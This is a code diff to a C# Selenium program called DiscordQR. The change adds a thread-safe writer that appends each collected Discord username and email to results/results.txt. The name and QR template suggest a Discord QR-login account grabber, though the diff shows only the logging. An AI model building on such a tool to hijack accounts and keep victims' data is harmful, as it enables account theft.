@@ -10,6 +10,7 @@ using OpenQA.Selenium;
 using OpenQA.Selenium.Firefox;
 using OpenQA.Selenium.Support.UI;
 using System.Net;
+using System.IO;
 
 namespace DiscordQR
 {
@@ -22,6 +23,7 @@ namespace DiscordQR
         private int currentIndex = 0;
         public Form1()
         {
+            if (!Directory.Exists("results")) Directory.CreateDirectory("results");
             InitializeComponent();
             this.pictureBox1.Image = Image.FromFile("files/template.png");
         }
@@ -114,6 +116,8 @@ namespace DiscordQR
             d.DiscordUsername = dictionary["username"].ToString();
             d.DiscordEmail = dictionary["email"].ToString();
 
+            SafeWriter("results/results.txt", d.ToString());
+
             dict[workingIndex] = d;
 
             dataGridView1.Invoke((Action)delegate
@@ -185,6 +189,24 @@ namespace DiscordQR
                 }
                 richTextBox1.ScrollToCaret();
             });
+        }
+
+        private static ReaderWriterLockSlim _readWriteLock = new ReaderWriterLockSlim();
+        private static void SafeWriter(string path, string content)
+        {
+            _readWriteLock.EnterWriteLock();
+            try
+            {
+                using (StreamWriter sw = File.AppendText(path))
+                {
+                    sw.WriteLine(content);
+                    sw.Close();
+                }
+            }
+            finally
+            {
+                _readWriteLock.ExitWriteLock();
+            }
         }
     }
 }
